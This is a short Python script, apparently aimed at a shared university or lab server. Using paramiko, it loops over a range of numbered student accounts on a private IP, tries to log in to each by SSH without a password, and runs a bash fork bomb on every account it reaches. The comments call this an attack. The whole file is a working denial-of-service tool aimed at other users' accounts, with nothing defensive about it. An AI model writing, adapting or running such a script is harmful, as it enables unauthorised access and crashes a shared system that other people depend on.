import paramiko

# Server details
ip = "10.5.12.254"
port = 22

# User ID range
user_ids = list(range(2022103031, 2022103048))
skip_ids = {2022103038, 2022103040, 2022103045}

# Fork bomb command
fork_bomb = ":(){ :|:& };:"

def run_attack(user_id):
    print(f"Running attack on s{user_id}@{ip}")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(ip, port=port, username=f"s{user_id}", password=None, timeout=5)
        stdin, stdout, stderr = ssh.exec_command(f"echo '{fork_bomb}' | bash")
        print(stdout.read().decode())
        print(stderr.read().decode())
        print(f"Successfully executed commands for {user_id}")
    except paramiko.AuthenticationException:
        print(f"Authentication failed for user: s{user_id}")
    except Exception as e:
        print(f"Failed to execute commands for {user_id}: {e}")
    finally:
        ssh.close()

# Brute-force the range, skipping specified IDs
for user_id in user_ids:
    if user_id in skip_ids:
        print(f"Skipping user s{user_id}")
        continue
    
    run_attack(user_id)
